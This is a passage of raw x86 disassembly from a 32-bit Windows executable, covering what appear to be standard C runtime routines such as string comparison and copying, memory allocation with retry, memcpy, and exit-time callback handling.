  4042ad:	e8 5a 23 00 00       	call   0x40660c
  4042b2:	85 c0                	test   %eax,%eax
  4042b4:	75 06                	jne    0x4042bc
  4042b6:	b8 28 f2 40 00       	mov    $0x40f228,%eax
  4042bb:	c3                   	ret
  4042bc:	83 c0 08             	add    $0x8,%eax
  4042bf:	c3                   	ret
  4042c0:	e8 47 23 00 00       	call   0x40660c
  4042c5:	85 c0                	test   %eax,%eax
  4042c7:	75 06                	jne    0x4042cf
  4042c9:	b8 2c f2 40 00       	mov    $0x40f22c,%eax
  4042ce:	c3                   	ret
  4042cf:	83 c0 0c             	add    $0xc,%eax
  4042d2:	c3                   	ret
  4042d3:	8b ff                	mov    %edi,%edi
  4042d5:	55                   	push   %ebp
  4042d6:	8b ec                	mov    %esp,%ebp
  4042d8:	56                   	push   %esi
  4042d9:	e8 e2 ff ff ff       	call   0x4042c0
  4042de:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4042e1:	51                   	push   %ecx
  4042e2:	89 08                	mov    %ecx,(%eax)
  4042e4:	e8 82 ff ff ff       	call   0x40426b
  4042e9:	59                   	pop    %ecx
  4042ea:	8b f0                	mov    %eax,%esi
  4042ec:	e8 bc ff ff ff       	call   0x4042ad
  4042f1:	89 30                	mov    %esi,(%eax)
  4042f3:	5e                   	pop    %esi
  4042f4:	5d                   	pop    %ebp
  4042f5:	c3                   	ret
  4042f6:	6a 0c                	push   $0xc
  4042f8:	68 28 d8 40 00       	push   $0x40d828
  4042fd:	e8 ce 07 00 00       	call   0x404ad0
  404302:	6a 0e                	push   $0xe
  404304:	e8 e2 29 00 00       	call   0x406ceb
  404309:	59                   	pop    %ecx
  40430a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40430e:	8b 75 08             	mov    0x8(%ebp),%esi
  404311:	8b 4e 04             	mov    0x4(%esi),%ecx
  404314:	85 c9                	test   %ecx,%ecx
  404316:	74 2f                	je     0x404347
  404318:	a1 6c 0b 41 00       	mov    0x410b6c,%eax
  40431d:	ba 68 0b 41 00       	mov    $0x410b68,%edx
  404322:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404325:	85 c0                	test   %eax,%eax
  404327:	74 11                	je     0x40433a
  404329:	39 08                	cmp    %ecx,(%eax)
  40432b:	75 2c                	jne    0x404359
  40432d:	8b 48 04             	mov    0x4(%eax),%ecx
  404330:	89 4a 04             	mov    %ecx,0x4(%edx)
  404333:	50                   	push   %eax
  404334:	e8 72 f8 ff ff       	call   0x403bab
  404339:	59                   	pop    %ecx
  40433a:	ff 76 04             	push   0x4(%esi)
  40433d:	e8 69 f8 ff ff       	call   0x403bab
  404342:	59                   	pop    %ecx
  404343:	83 66 04 00          	andl   $0x0,0x4(%esi)
  404347:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40434e:	e8 0a 00 00 00       	call   0x40435d
  404353:	e8 bd 07 00 00       	call   0x404b15
  404358:	c3                   	ret
  404359:	8b d0                	mov    %eax,%edx
  40435b:	eb c5                	jmp    0x404322
  40435d:	6a 0e                	push   $0xe
  40435f:	e8 ae 28 00 00       	call   0x406c12
  404364:	59                   	pop    %ecx
  404365:	c3                   	ret
  404366:	cc                   	int3
  404367:	cc                   	int3
  404368:	cc                   	int3
  404369:	cc                   	int3
  40436a:	cc                   	int3
  40436b:	cc                   	int3
  40436c:	cc                   	int3
  40436d:	cc                   	int3
  40436e:	cc                   	int3
  40436f:	cc                   	int3
  404370:	8b 54 24 04          	mov    0x4(%esp),%edx
  404374:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404378:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40437e:	75 3c                	jne    0x4043bc
  404380:	8b 02                	mov    (%edx),%eax
  404382:	3a 01                	cmp    (%ecx),%al
  404384:	75 2e                	jne    0x4043b4
  404386:	0a c0                	or     %al,%al
  404388:	74 26                	je     0x4043b0
  40438a:	3a 61 01             	cmp    0x1(%ecx),%ah
  40438d:	75 25                	jne    0x4043b4
  40438f:	0a e4                	or     %ah,%ah
  404391:	74 1d                	je     0x4043b0
  404393:	c1 e8 10             	shr    $0x10,%eax
  404396:	3a 41 02             	cmp    0x2(%ecx),%al
  404399:	75 19                	jne    0x4043b4
  40439b:	0a c0                	or     %al,%al
  40439d:	74 11                	je     0x4043b0
  40439f:	3a 61 03             	cmp    0x3(%ecx),%ah
  4043a2:	75 10                	jne    0x4043b4
  4043a4:	83 c1 04             	add    $0x4,%ecx
  4043a7:	83 c2 04             	add    $0x4,%edx
  4043aa:	0a e4                	or     %ah,%ah
  4043ac:	75 d2                	jne    0x404380
  4043ae:	8b ff                	mov    %edi,%edi
  4043b0:	33 c0                	xor    %eax,%eax
  4043b2:	c3                   	ret
  4043b3:	90                   	nop
  4043b4:	1b c0                	sbb    %eax,%eax
  4043b6:	d1 e0                	shl    $1,%eax
  4043b8:	83 c0 01             	add    $0x1,%eax
  4043bb:	c3                   	ret
  4043bc:	f7 c2 01 00 00 00    	test   $0x1,%edx
  4043c2:	74 18                	je     0x4043dc
  4043c4:	8a 02                	mov    (%edx),%al
  4043c6:	83 c2 01             	add    $0x1,%edx
  4043c9:	3a 01                	cmp    (%ecx),%al
  4043cb:	75 e7                	jne    0x4043b4
  4043cd:	83 c1 01             	add    $0x1,%ecx
  4043d0:	0a c0                	or     %al,%al
  4043d2:	74 dc                	je     0x4043b0
  4043d4:	f7 c2 02 00 00 00    	test   $0x2,%edx
  4043da:	74 a4                	je     0x404380
  4043dc:	66 8b 02             	mov    (%edx),%ax
  4043df:	83 c2 02             	add    $0x2,%edx
  4043e2:	3a 01                	cmp    (%ecx),%al
  4043e4:	75 ce                	jne    0x4043b4
  4043e6:	0a c0                	or     %al,%al
  4043e8:	74 c6                	je     0x4043b0
  4043ea:	3a 61 01             	cmp    0x1(%ecx),%ah
  4043ed:	75 c5                	jne    0x4043b4
  4043ef:	0a e4                	or     %ah,%ah
  4043f1:	74 bd                	je     0x4043b0
  4043f3:	83 c1 02             	add    $0x2,%ecx
  4043f6:	eb 88                	jmp    0x404380
  4043f8:	8b ff                	mov    %edi,%edi
  4043fa:	55                   	push   %ebp
  4043fb:	8b ec                	mov    %esp,%ebp
  4043fd:	8b 55 08             	mov    0x8(%ebp),%edx
  404400:	56                   	push   %esi
  404401:	57                   	push   %edi
  404402:	85 d2                	test   %edx,%edx
  404404:	74 07                	je     0x40440d
  404406:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404409:	85 ff                	test   %edi,%edi
  40440b:	75 13                	jne    0x404420
  40440d:	e8 9b fe ff ff       	call   0x4042ad
  404412:	6a 16                	push   $0x16
  404414:	5e                   	pop    %esi
  404415:	89 30                	mov    %esi,(%eax)
  404417:	e8 3f fe ff ff       	call   0x40425b
  40441c:	8b c6                	mov    %esi,%eax
  40441e:	eb 33                	jmp    0x404453
  404420:	8b 45 10             	mov    0x10(%ebp),%eax
  404423:	85 c0                	test   %eax,%eax
  404425:	75 04                	jne    0x40442b
  404427:	88 02                	mov    %al,(%edx)
  404429:	eb e2                	jmp    0x40440d
  40442b:	8b f2                	mov    %edx,%esi
  40442d:	2b f0                	sub    %eax,%esi
  40442f:	8a 08                	mov    (%eax),%cl
  404431:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  404434:	40                   	inc    %eax
  404435:	84 c9                	test   %cl,%cl
  404437:	74 03                	je     0x40443c
  404439:	4f                   	dec    %edi
  40443a:	75 f3                	jne    0x40442f
  40443c:	85 ff                	test   %edi,%edi
  40443e:	75 11                	jne    0x404451
  404440:	c6 02 00             	movb   $0x0,(%edx)
  404443:	e8 65 fe ff ff       	call   0x4042ad
  404448:	6a 22                	push   $0x22
  40444a:	59                   	pop    %ecx
  40444b:	89 08                	mov    %ecx,(%eax)
  40444d:	8b f1                	mov    %ecx,%esi
  40444f:	eb c6                	jmp    0x404417
  404451:	33 c0                	xor    %eax,%eax
  404453:	5f                   	pop    %edi
  404454:	5e                   	pop    %esi
  404455:	5d                   	pop    %ebp
  404456:	c3                   	ret
  404457:	8b ff                	mov    %edi,%edi
  404459:	55                   	push   %ebp
  40445a:	8b ec                	mov    %esp,%ebp
  40445c:	53                   	push   %ebx
  40445d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404460:	83 fb e0             	cmp    $0xffffffe0,%ebx
  404463:	77 6f                	ja     0x4044d4
  404465:	56                   	push   %esi
  404466:	57                   	push   %edi
  404467:	83 3d f4 13 41 00 00 	cmpl   $0x0,0x4113f4
  40446e:	75 18                	jne    0x404488
  404470:	e8 14 19 00 00       	call   0x405d89
  404475:	6a 1e                	push   $0x1e
  404477:	e8 5e 17 00 00       	call   0x405bda
  40447c:	68 ff 00 00 00       	push   $0xff
  404481:	e8 7c 03 00 00       	call   0x404802
  404486:	59                   	pop    %ecx
  404487:	59                   	pop    %ecx
  404488:	85 db                	test   %ebx,%ebx
  40448a:	74 04                	je     0x404490
  40448c:	8b c3                	mov    %ebx,%eax
  40448e:	eb 03                	jmp    0x404493
  404490:	33 c0                	xor    %eax,%eax
  404492:	40                   	inc    %eax
  404493:	50                   	push   %eax
  404494:	6a 00                	push   $0x0
  404496:	ff 35 f4 13 41 00    	push   0x4113f4
  40449c:	ff 15 9c b0 40 00    	call   *0x40b09c
  4044a2:	8b f8                	mov    %eax,%edi
  4044a4:	85 ff                	test   %edi,%edi
  4044a6:	75 26                	jne    0x4044ce
  4044a8:	6a 0c                	push   $0xc
  4044aa:	5e                   	pop    %esi
  4044ab:	39 05 84 15 41 00    	cmp    %eax,0x411584
  4044b1:	74 0d                	je     0x4044c0
  4044b3:	53                   	push   %ebx
  4044b4:	e8 e4 01 00 00       	call   0x40469d
  4044b9:	59                   	pop    %ecx
  4044ba:	85 c0                	test   %eax,%eax
  4044bc:	75 a9                	jne    0x404467
  4044be:	eb 07                	jmp    0x4044c7
  4044c0:	e8 e8 fd ff ff       	call   0x4042ad
  4044c5:	89 30                	mov    %esi,(%eax)
  4044c7:	e8 e1 fd ff ff       	call   0x4042ad
  4044cc:	89 30                	mov    %esi,(%eax)
  4044ce:	8b c7                	mov    %edi,%eax
  4044d0:	5f                   	pop    %edi
  4044d1:	5e                   	pop    %esi
  4044d2:	eb 14                	jmp    0x4044e8
  4044d4:	53                   	push   %ebx
  4044d5:	e8 c3 01 00 00       	call   0x40469d
  4044da:	59                   	pop    %ecx
  4044db:	e8 cd fd ff ff       	call   0x4042ad
  4044e0:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  4044e6:	33 c0                	xor    %eax,%eax
  4044e8:	5b                   	pop    %ebx
  4044e9:	5d                   	pop    %ebp
  4044ea:	c3                   	ret
  4044eb:	cc                   	int3
  4044ec:	cc                   	int3
  4044ed:	cc                   	int3
  4044ee:	cc                   	int3
  4044ef:	cc                   	int3
  4044f0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4044f4:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4044fa:	74 24                	je     0x404520
  4044fc:	8a 01                	mov    (%ecx),%al
  4044fe:	83 c1 01             	add    $0x1,%ecx
  404501:	84 c0                	test   %al,%al
  404503:	74 4e                	je     0x404553
  404505:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40450b:	75 ef                	jne    0x4044fc
  40450d:	05 00 00 00 00       	add    $0x0,%eax
  404512:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404519:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404520:	8b 01                	mov    (%ecx),%eax
  404522:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  404527:	03 d0                	add    %eax,%edx
  404529:	83 f0 ff             	xor    $0xffffffff,%eax
  40452c:	33 c2                	xor    %edx,%eax
  40452e:	83 c1 04             	add    $0x4,%ecx
  404531:	a9 00 01 01 81       	test   $0x81010100,%eax
  404536:	74 e8                	je     0x404520
  404538:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40453b:	84 c0                	test   %al,%al
  40453d:	74 32                	je     0x404571
  40453f:	84 e4                	test   %ah,%ah
  404541:	74 24                	je     0x404567
  404543:	a9 00 00 ff 00       	test   $0xff0000,%eax
  404548:	74 13                	je     0x40455d
  40454a:	a9 00 00 00 ff       	test   $0xff000000,%eax
  40454f:	74 02                	je     0x404553
  404551:	eb cd                	jmp    0x404520
  404553:	8d 41 ff             	lea    -0x1(%ecx),%eax
  404556:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40455a:	2b c1                	sub    %ecx,%eax
  40455c:	c3                   	ret
  40455d:	8d 41 fe             	lea    -0x2(%ecx),%eax
  404560:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404564:	2b c1                	sub    %ecx,%eax
  404566:	c3                   	ret
  404567:	8d 41 fd             	lea    -0x3(%ecx),%eax
  40456a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40456e:	2b c1                	sub    %ecx,%eax
  404570:	c3                   	ret
  404571:	8d 41 fc             	lea    -0x4(%ecx),%eax
  404574:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404578:	2b c1                	sub    %ecx,%eax
  40457a:	c3                   	ret
  40457b:	57                   	push   %edi
  40457c:	8b c6                	mov    %esi,%eax
  40457e:	83 e0 0f             	and    $0xf,%eax
  404581:	85 c0                	test   %eax,%eax
  404583:	0f 85 c1 00 00 00    	jne    0x40464a
  404589:	8b d1                	mov    %ecx,%edx
  40458b:	83 e1 7f             	and    $0x7f,%ecx
  40458e:	c1 ea 07             	shr    $0x7,%edx
  404591:	74 65                	je     0x4045f8
  404593:	eb 06                	jmp    0x40459b
  404595:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  40459b:	66 0f 6f 06          	movdqa (%esi),%xmm0
  40459f:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  4045a4:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
  4045a9:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  4045ae:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  4045b2:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  4045b7:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  4045bc:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  4045c1:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  4045c6:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  4045cb:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  4045d0:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  4045d5:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  4045da:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
  4045df:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  4045e4:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  4045e9:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  4045ef:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  4045f5:	4a                   	dec    %edx
  4045f6:	75 a3                	jne    0x40459b
  4045f8:	85 c9                	test   %ecx,%ecx
  4045fa:	74 49                	je     0x404645
  4045fc:	8b d1                	mov    %ecx,%edx
  4045fe:	c1 ea 04             	shr    $0x4,%edx
  404601:	85 d2                	test   %edx,%edx
  404603:	74 17                	je     0x40461c
  404605:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  40460b:	66 0f 6f 06          	movdqa (%esi),%xmm0
  40460f:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  404613:	8d 76 10             	lea    0x10(%esi),%esi
  404616:	8d 7f 10             	lea    0x10(%edi),%edi
  404619:	4a                   	dec    %edx
  40461a:	75 ef                	jne    0x40460b
  40461c:	83 e1 0f             	and    $0xf,%ecx
  40461f:	74 24                	je     0x404645
  404621:	8b c1                	mov    %ecx,%eax
  404623:	c1 e9 02             	shr    $0x2,%ecx
  404626:	74 0d                	je     0x404635
  404628:	8b 16                	mov    (%esi),%edx
  40462a:	89 17                	mov    %edx,(%edi)
  40462c:	8d 76 04             	lea    0x4(%esi),%esi
  40462f:	8d 7f 04             	lea    0x4(%edi),%edi
  404632:	49                   	dec    %ecx
  404633:	75 f3                	jne    0x404628
  404635:	8b c8                	mov    %eax,%ecx
  404637:	83 e1 03             	and    $0x3,%ecx
  40463a:	74 09                	je     0x404645
  40463c:	8a 06                	mov    (%esi),%al
  40463e:	88 07                	mov    %al,(%edi)
  404640:	46                   	inc    %esi
  404641:	47                   	inc    %edi
  404642:	49                   	dec    %ecx
  404643:	75 f7                	jne    0x40463c
  404645:	58                   	pop    %eax
  404646:	5e                   	pop    %esi
  404647:	5f                   	pop    %edi
  404648:	5d                   	pop    %ebp
  404649:	c3                   	ret
  40464a:	ba 10 00 00 00       	mov    $0x10,%edx
  40464f:	2b d0                	sub    %eax,%edx
  404651:	2b ca                	sub    %edx,%ecx
  404653:	51                   	push   %ecx
  404654:	8b c2                	mov    %edx,%eax
  404656:	8b c8                	mov    %eax,%ecx
  404658:	83 e1 03             	and    $0x3,%ecx
  40465b:	74 09                	je     0x404666
  40465d:	8a 16                	mov    (%esi),%dl
  40465f:	88 17                	mov    %dl,(%edi)
  404661:	46                   	inc    %esi
  404662:	47                   	inc    %edi
  404663:	49                   	dec    %ecx
  404664:	75 f7                	jne    0x40465d
  404666:	c1 e8 02             	shr    $0x2,%eax
  404669:	74 0d                	je     0x404678
  40466b:	8b 16                	mov    (%esi),%edx
  40466d:	89 17                	mov    %edx,(%edi)
  40466f:	8d 76 04             	lea    0x4(%esi),%esi
  404672:	8d 7f 04             	lea    0x4(%edi),%edi
  404675:	48                   	dec    %eax
  404676:	75 f3                	jne    0x40466b
  404678:	59                   	pop    %ecx
  404679:	e9 0b ff ff ff       	jmp    0x404589
  40467e:	6a 0a                	push   $0xa
  404680:	ff 15 00 b1 40 00    	call   *0x40b100
  404686:	a3 5c 27 41 00       	mov    %eax,0x41275c
  40468b:	33 c0                	xor    %eax,%eax
  40468d:	c3                   	ret
  40468e:	8b ff                	mov    %edi,%edi
  404690:	55                   	push   %ebp
  404691:	8b ec                	mov    %esp,%ebp
  404693:	8b 45 08             	mov    0x8(%ebp),%eax
  404696:	a3 70 0b 41 00       	mov    %eax,0x410b70
  40469b:	5d                   	pop    %ebp
  40469c:	c3                   	ret
  40469d:	8b ff                	mov    %edi,%edi
  40469f:	55                   	push   %ebp
  4046a0:	8b ec                	mov    %esp,%ebp
  4046a2:	ff 35 70 0b 41 00    	push   0x410b70
  4046a8:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  4046ae:	85 c0                	test   %eax,%eax
  4046b0:	74 0f                	je     0x4046c1
  4046b2:	ff 75 08             	push   0x8(%ebp)
  4046b5:	ff d0                	call   *%eax
  4046b7:	59                   	pop    %ecx
  4046b8:	85 c0                	test   %eax,%eax
  4046ba:	74 05                	je     0x4046c1
  4046bc:	33 c0                	xor    %eax,%eax
  4046be:	40                   	inc    %eax
  4046bf:	5d                   	pop    %ebp
  4046c0:	c3                   	ret
  4046c1:	33 c0                	xor    %eax,%eax
  4046c3:	5d                   	pop    %ebp
  4046c4:	c3                   	ret
  4046c5:	8b ff                	mov    %edi,%edi
  4046c7:	55                   	push   %ebp
  4046c8:	8b ec                	mov    %esp,%ebp
  4046ca:	56                   	push   %esi
  4046cb:	57                   	push   %edi
  4046cc:	33 f6                	xor    %esi,%esi
  4046ce:	ff 75 08             	push   0x8(%ebp)
  4046d1:	e8 81 fd ff ff       	call   0x404457
  4046d6:	8b f8                	mov    %eax,%edi
  4046d8:	59                   	pop    %ecx
  4046d9:	85 ff                	test   %edi,%edi
  4046db:	75 27                	jne    0x404704
  4046dd:	39 05 74 0b 41 00    	cmp    %eax,0x410b74
  4046e3:	76 1f                	jbe    0x404704
  4046e5:	56                   	push   %esi
  4046e6:	ff 15 4c b0 40 00    	call   *0x40b04c
  4046ec:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  4046f2:	3b 05 74 0b 41 00    	cmp    0x410b74,%eax
  4046f8:	76 03                	jbe    0x4046fd
  4046fa:	83 c8 ff             	or     $0xffffffff,%eax
  4046fd:	8b f0                	mov    %eax,%esi
  4046ff:	83 f8 ff             	cmp    $0xffffffff,%eax
  404702:	75 ca                	jne    0x4046ce
  404704:	8b c7                	mov    %edi,%eax
  404706:	5f                   	pop    %edi
  404707:	5e                   	pop    %esi
  404708:	5d                   	pop    %ebp
  404709:	c3                   	ret
  40470a:	8b ff                	mov    %edi,%edi
  40470c:	55                   	push   %ebp
  40470d:	8b ec                	mov    %esp,%ebp
  40470f:	56                   	push   %esi
  404710:	57                   	push   %edi
  404711:	33 f6                	xor    %esi,%esi
  404713:	6a 00                	push   $0x0
  404715:	ff 75 0c             	push   0xc(%ebp)
  404718:	ff 75 08             	push   0x8(%ebp)
  40471b:	e8 fe 25 00 00       	call   0x406d1e
  404720:	8b f8                	mov    %eax,%edi
  404722:	83 c4 0c             	add    $0xc,%esp
  404725:	85 ff                	test   %edi,%edi
  404727:	75 27                	jne    0x404750
  404729:	39 05 74 0b 41 00    	cmp    %eax,0x410b74
  40472f:	76 1f                	jbe    0x404750
  404731:	56                   	push   %esi
  404732:	ff 15 4c b0 40 00    	call   *0x40b04c
  404738:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  40473e:	3b 05 74 0b 41 00    	cmp    0x410b74,%eax
  404744:	76 03                	jbe    0x404749
  404746:	83 c8 ff             	or     $0xffffffff,%eax
  404749:	8b f0                	mov    %eax,%esi
  40474b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40474e:	75 c3                	jne    0x404713
  404750:	8b c7                	mov    %edi,%eax
  404752:	5f                   	pop    %edi
  404753:	5e                   	pop    %esi
  404754:	5d                   	pop    %ebp
  404755:	c3                   	ret
  404756:	8b ff                	mov    %edi,%edi
  404758:	55                   	push   %ebp
  404759:	8b ec                	mov    %esp,%ebp
  40475b:	56                   	push   %esi
  40475c:	57                   	push   %edi
  40475d:	33 f6                	xor    %esi,%esi
  40475f:	ff 75 0c             	push   0xc(%ebp)
  404762:	ff 75 08             	push   0x8(%ebp)
  404765:	e8 52 23 00 00       	call   0x406abc
  40476a:	8b f8                	mov    %eax,%edi
  40476c:	59                   	pop    %ecx
  40476d:	59                   	pop    %ecx
  40476e:	85 ff                	test   %edi,%edi
  404770:	75 2c                	jne    0x40479e
  404772:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404775:	74 27                	je     0x40479e
  404777:	39 05 74 0b 41 00    	cmp    %eax,0x410b74
  40477d:	76 1f                	jbe    0x40479e
  40477f:	56                   	push   %esi
  404780:	ff 15 4c b0 40 00    	call   *0x40b04c
  404786:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  40478c:	3b 05 74 0b 41 00    	cmp    0x410b74,%eax
  404792:	76 03                	jbe    0x404797
  404794:	83 c8 ff             	or     $0xffffffff,%eax
  404797:	8b f0                	mov    %eax,%esi
  404799:	83 f8 ff             	cmp    $0xffffffff,%eax
  40479c:	75 c1                	jne    0x40475f
  40479e:	8b c7                	mov    %edi,%eax
  4047a0:	5f                   	pop    %edi
  4047a1:	5e                   	pop    %esi
  4047a2:	5d                   	pop    %ebp
  4047a3:	c3                   	ret
  4047a4:	8b ff                	mov    %edi,%edi
  4047a6:	55                   	push   %ebp
  4047a7:	8b ec                	mov    %esp,%ebp
  4047a9:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4047ad:	75 15                	jne    0x4047c4
  4047af:	e8 f9 fa ff ff       	call   0x4042ad
  4047b4:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4047ba:	e8 9c fa ff ff       	call   0x40425b
  4047bf:	83 c8 ff             	or     $0xffffffff,%eax
  4047c2:	5d                   	pop    %ebp
  4047c3:	c3                   	ret
  4047c4:	ff 75 08             	push   0x8(%ebp)
  4047c7:	6a 00                	push   $0x0
  4047c9:	ff 35 f4 13 41 00    	push   0x4113f4
  4047cf:	ff 15 a8 b0 40 00    	call   *0x40b0a8
  4047d5:	5d                   	pop    %ebp
  4047d6:	c3                   	ret
  4047d7:	8b ff                	mov    %edi,%edi
  4047d9:	55                   	push   %ebp
  4047da:	8b ec                	mov    %esp,%ebp
  4047dc:	68 f8 b2 40 00       	push   $0x40b2f8
  4047e1:	ff 15 58 b0 40 00    	call   *0x40b058
  4047e7:	85 c0                	test   %eax,%eax
  4047e9:	74 15                	je     0x404800
  4047eb:	68 e8 b2 40 00       	push   $0x40b2e8
  4047f0:	50                   	push   %eax
  4047f1:	ff 15 48 b0 40 00    	call   *0x40b048
  4047f7:	85 c0                	test   %eax,%eax
  4047f9:	74 05                	je     0x404800
  4047fb:	ff 75 08             	push   0x8(%ebp)
  4047fe:	ff d0                	call   *%eax
  404800:	5d                   	pop    %ebp
  404801:	c3                   	ret
  404802:	8b ff                	mov    %edi,%edi
  404804:	55                   	push   %ebp
  404805:	8b ec                	mov    %esp,%ebp
  404807:	ff 75 08             	push   0x8(%ebp)
  40480a:	e8 c8 ff ff ff       	call   0x4047d7
  40480f:	59                   	pop    %ecx
  404810:	ff 75 08             	push   0x8(%ebp)
  404813:	ff 15 04 b1 40 00    	call   *0x40b104
  404819:	cc                   	int3
  40481a:	6a 08                	push   $0x8
  40481c:	e8 ca 24 00 00       	call   0x406ceb
  404821:	59                   	pop    %ecx
  404822:	c3                   	ret
  404823:	6a 08                	push   $0x8
  404825:	e8 e8 23 00 00       	call   0x406c12
  40482a:	59                   	pop    %ecx
  40482b:	c3                   	ret
  40482c:	8b ff                	mov    %edi,%edi
  40482e:	56                   	push   %esi
  40482f:	e8 a1 1c 00 00       	call   0x4064d5
  404834:	8b f0                	mov    %eax,%esi
  404836:	56                   	push   %esi
  404837:	e8 52 fe ff ff       	call   0x40468e
  40483c:	56                   	push   %esi
  40483d:	e8 8f f8 ff ff       	call   0x4040d1
  404842:	56                   	push   %esi
  404843:	e8 01 28 00 00       	call   0x407049
  404848:	56                   	push   %esi
  404849:	e8 ec 27 00 00       	call   0x40703a
  40484e:	56                   	push   %esi
  40484f:	e8 e1 25 00 00       	call   0x406e35
  404854:	56                   	push   %esi
  404855:	e8 ca 25 00 00       	call   0x406e24
  40485a:	83 c4 18             	add    $0x18,%esp
  40485d:	5e                   	pop    %esi
  40485e:	c3                   	ret
  40485f:	8b ff                	mov    %edi,%edi
  404861:	55                   	push   %ebp
  404862:	8b ec                	mov    %esp,%ebp
  404864:	56                   	push   %esi
  404865:	8b 75 08             	mov    0x8(%ebp),%esi
  404868:	33 c0                	xor    %eax,%eax
  40486a:	eb 0f                	jmp    0x40487b
  40486c:	85 c0                	test   %eax,%eax
  40486e:	75 10                	jne    0x404880
  404870:	8b 0e                	mov    (%esi),%ecx
  404872:	85 c9                	test   %ecx,%ecx
  404874:	74 02                	je     0x404878
  404876:	ff d1                	call   *%ecx
  404878:	83 c6 04             	add    $0x4,%esi
  40487b:	3b 75 0c             	cmp    0xc(%ebp),%esi
  40487e:	72 ec                	jb     0x40486c
  404880:	5e                   	pop    %esi
  404881:	5d                   	pop    %ebp
  404882:	c3                   	ret
  404883:	8b ff                	mov    %edi,%edi
  404885:	55                   	push   %ebp
  404886:	8b ec                	mov    %esp,%ebp
  404888:	83 3d 54 27 41 00 00 	cmpl   $0x0,0x412754
  40488f:	74 19                	je     0x4048aa
  404891:	68 54 27 41 00       	push   $0x412754
  404896:	e8 75 28 00 00       	call   0x407110
  40489b:	59                   	pop    %ecx
  40489c:	85 c0                	test   %eax,%eax
  40489e:	74 0a                	je     0x4048aa
  4048a0:	ff 75 08             	push   0x8(%ebp)
  4048a3:	ff 15 54 27 41 00    	call   *0x412754
  4048a9:	59                   	pop    %ecx
  4048aa:	e8 a9 27 00 00       	call   0x407058
  4048af:	68 c4 b1 40 00       	push   $0x40b1c4
  4048b4:	68 ac b1 40 00       	push   $0x40b1ac
  4048b9:	e8 a1 ff ff ff       	call   0x40485f
  4048be:	59                   	pop    %ecx
  4048bf:	59                   	pop    %ecx
  4048c0:	85 c0                	test   %eax,%eax
  4048c2:	75 54                	jne    0x404918
  4048c4:	56                   	push   %esi
  4048c5:	57                   	push   %edi
  4048c6:	68 af 64 40 00       	push   $0x4064af
  4048cb:	e8 03 f0 ff ff       	call   0x4038d3
  4048d0:	b8 94 b1 40 00       	mov    $0x40b194,%eax
  4048d5:	be a8 b1 40 00       	mov    $0x40b1a8,%esi
  4048da:	59                   	pop    %ecx
  4048db:	8b f8                	mov    %eax,%edi
  4048dd:	3b c6                	cmp    %esi,%eax
  4048df:	73 0f                	jae    0x4048f0
  4048e1:	8b 07                	mov    (%edi),%eax
  4048e3:	85 c0                	test   %eax,%eax
  4048e5:	74 02                	je     0x4048e9
  4048e7:	ff d0                	call   *%eax
  4048e9:	83 c7 04             	add    $0x4,%edi
  4048ec:	3b fe                	cmp    %esi,%edi
  4048ee:	72 f1                	jb     0x4048e1
  4048f0:	83 3d 58 27 41 00 00 	cmpl   $0x0,0x412758
  4048f7:	5f                   	pop    %edi
  4048f8:	5e                   	pop    %esi
  4048f9:	74 1b                	je     0x404916
  4048fb:	68 58 27 41 00       	push   $0x412758
  404900:	e8 0b 28 00 00       	call   0x407110
  404905:	59                   	pop    %ecx
  404906:	85 c0                	test   %eax,%eax
  404908:	74 0c                	je     0x404916
  40490a:	6a 00                	push   $0x0
  40490c:	6a 02                	push   $0x2
  40490e:	6a 00                	push   $0x0
  404910:	ff 15 58 27 41 00    	call   *0x412758
  404916:	33 c0                	xor    %eax,%eax
  404918:	5d                   	pop    %ebp
  404919:	c3                   	ret
  40491a:	6a 20                	push   $0x20
  40491c:	68 48 d8 40 00       	push   $0x40d848
